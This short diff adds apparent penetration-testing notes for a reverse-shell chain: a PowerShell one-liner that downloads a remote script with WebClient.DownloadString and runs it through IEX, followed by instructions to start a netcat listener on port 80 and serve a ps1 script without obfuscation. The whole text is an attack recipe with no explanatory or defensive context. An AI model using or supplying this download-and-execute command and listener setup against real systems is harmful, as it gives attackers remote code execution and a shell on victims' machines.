@@ -1,0 +1,8 @@
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(‘link ‘of payload)”
+
+
+Add a netcat lisener at port 80
+
+—> ps1 script
+
+Without obsufication
